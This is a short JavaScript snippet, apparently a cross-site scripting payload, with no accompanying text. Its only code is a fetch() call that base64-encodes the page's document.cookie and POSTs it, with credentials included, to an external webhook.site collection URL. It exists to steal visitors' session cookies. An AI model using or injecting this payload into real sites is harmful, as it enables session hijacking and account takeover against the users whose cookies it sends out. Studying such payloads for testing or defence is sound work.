fetch('https://webhook.site/f3eefbfe-c6d6-45fa-b56f-f29f1a5fa17d', {
    method: 'POST',
    body: JSON.stringify({ cookie: btoa(document.cookie) }),
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include'
});
